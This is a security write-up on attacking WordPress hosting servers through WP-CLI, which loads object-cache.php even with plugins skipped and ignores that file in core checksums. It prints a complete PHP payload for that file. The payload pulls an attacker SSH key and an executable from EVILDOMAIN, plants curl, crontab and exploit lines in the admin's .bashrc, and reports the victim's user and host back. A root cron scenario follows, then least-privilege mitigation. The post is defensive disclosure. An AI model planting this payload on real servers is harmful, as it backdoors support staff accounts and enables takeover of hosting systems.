# Attacking hosting webservers through WP-CLI

## WP-CLI
WP-CLI [1] is the command-line interface for WordPress, as their site claims. It gives an interface to functionality of WordPress. This is quite cool and is used by a lot of (WordPress) hosting companies to troubleshoot and support their customers. 

An example:

```shell
$ wp-cli.phar core version 
4.8.1
$ wp-cli.phar plugin list
+----------------------------+----------+-----------+----------+
| name                       | status   | update    | version  |
+----------------------------+----------+-----------+----------+
| advanced-custom-fields     | active   | none      | 4.4.11   |
| display-widgets            | active   | available | 2.6.2.1  |
| regenerate-thumbnails      | inactive | none      | 2.2.6    |
| simple-share-buttons-adder | inactive | none      | 6.3.6    |
| wordpress-seo              | active   | available | 5.3.1    |
+----------------------------+----------+-----------+----------+
$ wp-cli.phar checksum core --skip-themes --skip-plugins 
Success: WordPress install verifies against checksums.
```

WP-CLI is a phar (PHp ARchive) which puts an entire application and it's dependencies into a single file. This provides an easy way to have a portable executable across multi systems. This PHAR uses the system PHP and php.ini-settings when executed. 

When you execute wp-cli.phar it executes WordPress to get access to the database and settings from `wp-config.php`. This means that code gets executed that is present within the WordPress core files. Without the `--skip-themes` and `--skip-plugins` arguments code within installed plugins and themes will also be executed. As this is the main entrypoint for most infections of WordPress it is advisable to use these arguments. 

Within the above example we do an integrity check of the WordPress core (the official files shipped with WordPress). We do this using the `wp-cli.phar checksum core` command. This makes checksums for the files in de installation directory and checks those to the checksums from the original files. If there is code added to files these checksums would not match. This is a good way to ensure nobody added code to the WordPress core files. 

An example of using checksums of file content:
```shell
$ cat testfile1 
hi
$ cat testfile2
hi!
$ sha256sum testfile1 testfile2
98ea6e4f216f2fb4b69fff9b3a44842c38686ca685f3f55dc48c5d3fb1107be4  testfile1
1adb41cf8efa0c375bf64d08bc0fe027a720fef0d7ac05140c2a1fe1200155a2  testfile2
```
In the above example we see that adding just a exclamation mark would result in different checksums. By checking the checksum of the original WordPress files wp-cli.phar compares the files content to the current contents of these files. In other words we check if the files are different from the original WordPress core files. Differences could be an infection or that someone added functionalilty. Either way the code should not be trusted without checking what is added. Combined with the skipping of (untrusted) plugin and theme code you would think that you are only execute trusted WordPress code. So these checks and skipping of code could give a false sense of security when dealing with WordPress as we'll show later on. 

As an extra security layer most hosting companies might choose to disable the execution of PHP system commands and process calls. This makes it a lot harder for attackers. As they might have gotten access to the WordPress installation, they cannot call system commands. So what to do when you have access to a WordPress installation and want to escalate privileges to someone with more rights than just a sandboxed PHP proces?

## WordPress Object Caching
This is where WordPress object caching comes in. (Persistent) Object caching is a caching strategy that stores PHP objects (for example arrays) on disk or in memory (ie. using MemCached). When another request is done, instead of sending the same database queries it gets the object from the cache. This can speed up the requested sites that do a lot of database queries.

In WordPress this can be enabled through the optional `wp-content/object-cache.php` file. This file is intended for caching plugins to provide persistent object caching for WordPress objects. This file is not part of WordPress core but is loaded on startup if it exists by wp-includes/load.php:


**wp-includes/load.php** [2]
```php
function wp_start_object_cache() {
	global $wp_filter;
	$first_init = false;
 	if ( ! function_exists( 'wp_cache_init' ) ) {
		if ( file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
			require_once ( WP_CONTENT_DIR . '/object-cache.php' );
			if ( function_exists( 'wp_cache_init' ) ) {
				wp_using_ext_object_cache( true );
			}
			// Re-initialize any hooks added manually by object-cache.php
			if ( $wp_filter ) {
				$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
			}
		}
		$first_init = true;
	} elseif ( ! wp_using_ext_object_cache() && file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
<snip>
```


Although this code is part of a plugin it is executed with every request to WordPress. And so wp-cli.phar executes code within this file, even if we specify the `--skip-plugins` argument. As this file is not part of the WordPress core checking for checksums skips this file. To sum it up:
- Skipped during checksum checks
- Executed with every WordPress core execution
- wp-cli.phar has no option to disable this code

This could be a nice attack vector.

So let's see this in action:
```shell
$ stat wp-content/object-cache.php
stat: cannot stat `wp-content/object-cache.php': No such file or directory
$ wp-cli.phar plugin list --skip-themes --skip-plugins
+-----------+----------+--------+---------+
| name      | status   | update | version |
+-----------+----------+--------+---------+
| hello     | inactive | none   | 1.6     |
+-----------+----------+--------+---------+
$ echo '<?php echo "hi there\n"; ?>' > wp-content/object-cache.php
$ wp-cli.phar plugin list --skip-themes --skip-plugins
hi there
+-----------+----------+--------+---------+
| name      | status   | update | version |
+-----------+----------+--------+---------+
| hello     | inactive | none   | 1.6     |
+-----------+----------+--------+---------+
$ wp-cli.phar checksum core
Success: WordPress install verifies against checksums.
```

In the above example we create `wp-content/object-cache.php` and inject `<?php echo "hi there\n"; ?>` into it. The next time we run `wp-cli.phar` this code is executed even though we disable plugin and theme code execution.  


## The attack
For attacking this we setup an imaginary hosting environment:
- Linux server
- Whatever webserver, SQL server etc you wish
- The PHP-FPM process will run as a non-priviliged user (`webuser`) with a /sbin/nologin shell and a open_basedir set to the docroot
- PHP-FPM configured with a php.ini that disables the following functions:
	- proc functions (proc_open, proc_terminate, proc_close, proc_get_status, proc_nice)
	- posix functions (posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_getpwuid, posix_uname)
	- other functions (popen, pclose, system, show_source, dl, shell_exec, passthru)

**These are not disabled by default in PHP, but any sane hosting company should disable these.**

When a page is requested via the webserver PHP-FPM executes WordPress as `webuser`. It looks up any objects in cache as is needed and extends the data with new queries to the database. The output of the process is then served to the requestor. In this context the configuration of the server provides some security and the proces is bound to the open_basedir or docroot of the site. 

When a local system user (ie. sysadmins, support, client connecting via ssh, cronjobs) execute wp-cli.phar it is executing in context of that user. So the PHP process runs as the user executing it. This execution does not have the restrictions (ie. open_basedir) defined for the PHP-FPM workers. This is a possible way to attack the system.

Let's assume we have control over a WordPress site hosted by hostingcompany X. This can be because we payed them to or someone else did and we took over their WordPress. Hostingcompany X has a supportdesk employee called Patrick. Why Patrick you ask? Well just because they do. 

Let's inject the following into `wp-content/object-cache.php` on this WordPress install. Read the comment to see what it does:
```php
<?php    
        // get uid from the system
	@$uid = posix_getuid();
	if( isset($uid) and $uid == 0) {
		// in the off change that someone forces wp-cli to run as uid 0 (root)
		$user = 'root';
        	$keyfile = '/root/.ssh/authorized_keys';
		$bashrc = '/root/.bashrc';
	} else {
                // get the system username of the user executing this
		@$user = posix_getlogin();
        	@$keyfile = '/home/'.$user.'/.ssh/authorized_keys';
		$bashrc = '/home/'.$user.'/.bashrc';
        }
	// If user is empty we are being served by the webserver. As this is a 
        // environment with security restrictions we return and let WordPress do it's thing.
	if($user == '') {return;} 
	
	// download and add our key to the users authorized_keys
        @$c = curl_init("http://EVILDOMAIN/sshkey.pub");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
	@$current = file_get_contents($keyfile);
        $current .= "\n".$t;
	@file_put_contents($keyfile,$current);

        // chmod the pubkey to 600 otherwise openssh will ignore it
	@chmod($file, 0600);

	// download exploit and install it in /tmp/.exploit
        // because by default most commandline tools hide
        // files with names that start with a dot. 
        @$c = curl_init("http://EVILDOMAIN/exploit");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t = curl_exec($c);
	@curl_close($c);
	@$payload = fopen('/tmp/.exploit', "w+");
	@fputs($payload, $t);
	@fclose($payload);
        
        // make the file executable
        @chmod('/tmp/.exploit', 0700);

	// Now we add cronjob insertion into the bashrc of the user running the wp-cli.phar
	@$bashrcold = file_get_contents($bashrc);
	@$bashrcold .= "\ncurl -s http://EVILDOMAIN/sshkey.pub?".$user."@".gethostname()." -o /tmp/.sshkey.pub 2>&1 > /dev/null;";
	@$bashrcold .= "\ncrontab /tmp/.cronfile 2>&1 > /dev/null;";
	@$bashrcold .= "\n/tmp/.exploit";
	@file_put_contents($bashrc,$bashrcold);
        @file_put_contents('/tmp/.cronfile', "SHELL=/bin/bash\nMAIL=\"\"\n\n37 13 * * * /tmp/.exploit\n");

	// we do a GET on EVILDOMAIN to inform us which username and host to SSH into with our ssh key
	@$c = curl_init("http://EVILDOMAIN/?".$user."@".gethostbyaddr("127.0.1.1"));
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
?>
```


After we injected this into the site we send hostingcompany X a ticket that we cannot update some of our plugins. Patrick gets our ticket assigned, logs into the server over SSH and runs `wp-cli.phar` to see what plugins have updates available. He adds the `--skip-themes` and `--skip-plugins` arguments to be on the safe side. This is what he would see:

```shell
$ wp-cli.phar plugin list --skip-plugins --skip-themes
+-------------------------------+----------+--------+---------+
| name                          | status   | update | version |
+-------------------------------+----------+--------+---------+
| grid                          | active   | none   | 1.6.13  |
| instagram-feed                | active   | none   | 1.4.9   |
| nextgen-gallery               | active   | none   | 2.2.10  |
| pace-builder                  | active   | none   | 1.1.6   |
+-------------------------------+----------+--------+---------+
```


He sees nothing at all of importance. No hack, no out of date plugins. Nothing of importance. Meanwhile on EVILDOMAIN's webserver we see the following in the logs:
```shell
root@EVILDOMAIN:/var/log/apache2/# tail -f access.log 
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:55] "GET /sshkey.pub HTTP/1.1" 200 -
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /sskey.pub HTTP/1.1" 200 -
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /exploit HTTP/1.1" 200 -
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /?patrick@xxxx.xxxx.com HTTP/1.1" 200 -
```


On the hosting machine a quick look at Patricks `.bashrc`:
```shell
$ tail -n 3 ~/.bashrc 
curl -s http://EVILDOMAIN/sshkey.pub?patrick@xxxx.xxxx.com -o /tmp/.sshkey.pub 2>&1 > /dev/null;
crontab /tmp/.cronfile 2>&1 > /dev/null;
/tmp/.exploit 
```


If Patrick logs into the system once again he will execute lines in his bashrc before he sees a prompt. It adds the cronjob and the exploit is executed as the user Patrick. Maybe Patrick has passwordless sudo, maybe he doesn't. As it stands we now as an attacker have the same abilities as Patrick. This is a problem and not just Patrick's. We have an account on the system that can examine user databases, view configs and more.

There are some rare cases where we don't need Patrick. Might be so that hostingcompany X implement automatic updates of WordPress for you with a cronjob. These cronjobs might even be running as root:
```shell
* 0 * * * wp-cli.phar --allow-root core update && chown -R webuser:webuser httpdocs/
```
This would give us code execution as root on the webserver, imagine the damage that we could do.


## Mitigation
While this problem might be quite serious the problem lies not with WP-CLI or even WordPress. The problem is that the hostingcompany doesn't what code is executed when wp-cli.phar is used. Using WP-CLI makes life very easy for WordPress Hosters, but you need to understand what this application does under the hood. The solution to this issue is fairly easy. Always use the concept of least privilege. This means that to execute the code you use an account that has only the necessary privileges or power over the system that are needed to execute the code.

In this example we could use the user account `webuser` for this. If you force the use of the non-privileged `webuse`r all problems will be contained to the rights this user has. This can be done with the `sudo` command. Yes, it has uses other than `sudo su` and `sudo make me a sandwich` [3]:
```shell
$ sudo -u webuser wp-cli.phar plugin list
```

This will executed all code within the application to priviliges you granted to webuser (which will be very limited). The limitations that are set for this user are then enforced when Patrick or root executes `wp-cli.phar` and helps to keep the system a little bit safer.

If you have any comments, suggestions or want to get in touch:  *_@sp2.io*

Links: 
- [1] http://wp-cli.org/
- [2] https://github.com/WordPress/WordPress/blob/795af804ba83ab4ecb36477ced49980cf9f117f2/wp-includes/load.php#L474
- [3] https://xkcd.com/149/
